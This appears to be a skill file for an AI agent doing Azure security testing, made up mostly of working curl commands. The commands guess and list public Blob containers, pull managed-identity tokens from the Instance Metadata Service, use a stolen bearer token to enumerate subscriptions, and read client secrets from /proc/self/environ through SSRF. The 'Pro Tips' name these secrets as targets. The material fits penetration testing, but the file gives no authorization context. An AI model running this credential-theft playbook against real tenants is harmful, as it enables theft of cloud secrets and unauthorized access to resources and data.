---
name: azure-security
description: Azure cloud security testing covering Blob storage, managed identity, Azure AD token theft, and Function App SSRF
---

# Azure Security Testing

## Key Vulnerabilities

### Blob Storage Misconfiguration

```bash
# Test public blob access
curl -sI "https://TARGET.blob.core.windows.net/\$root?restype=container&comp=list"
curl -sI "https://TARGET.blob.core.windows.net/public?restype=container&comp=list"
for container in assets data backup uploads images files logs config; do
  curl -sk "https://TARGET.blob.core.windows.net/$container?restype=container&comp=list" | grep -i "EnumerationResults" && echo "[VULN] $container is public!"
done
```

### Azure IMDS

```bash
# Azure Instance Metadata Service
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"
```

### Azure AD Token Theft

```bash
# Managed Identity token acquisition (via SSRF/RCE)
curl -s "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true"
# Use token to enumerate Azure resources
curl -s -H "Authorization: Bearer TOKEN" "https://management.azure.com/subscriptions?api-version=2020-01-01"
```

### Azure Function App Environment

```bash
# Function app environment variables via SSRF
# file:///proc/self/environ → AZURE_CLIENT_ID, AZURE_CLIENT_SECRET, AzureWebJobsStorage
```

## Pro Tips

1. Azure IMDS requires `Metadata: true` header — test if SSRF allows custom headers
2. Blob storage container names are guessable — enumerate common names
3. Azure AD managed identity tokens grant access to Azure Resource Manager, Key Vault, Storage
4. Azure Functions store connection strings in environment variables — target via local file read
